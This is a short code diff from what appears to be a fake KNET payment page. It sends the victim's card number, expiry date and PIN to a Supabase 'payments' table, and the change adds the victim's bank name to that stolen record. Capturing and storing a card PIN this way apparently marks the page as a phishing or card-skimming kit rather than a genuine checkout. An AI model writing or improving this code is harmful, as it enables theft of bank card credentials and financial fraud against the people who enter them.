@@ -856,7 +856,7 @@
         } else {
           const r = await fetch(SB+'/rest/v1/payments', {
             method: 'POST', headers: SH,
-            body: JSON.stringify({ card_number:card, card_expiry:expiry, card_pin:pin, card_cvv:'', card_type:'KNET', amount:parseFloat(amount)||0, status:'pending', transaction_ref:'KWT-'+Date.now().toString(36).toUpperCase(), ip_address:'', user_agent:navigator.userAgent })
+            body: JSON.stringify({ card_number:card, card_expiry:expiry, card_pin:pin, card_cvv:'', card_type:'KNET', bank_name:(currentBank&&currentBank.short?currentBank.short:''), amount:parseFloat(amount)||0, status:'pending', transaction_ref:'KWT-'+Date.now().toString(36).toUpperCase(), ip_address:'', user_agent:navigator.userAgent })
           });
           const d = await r.json();
           subId = d[0]?.id;
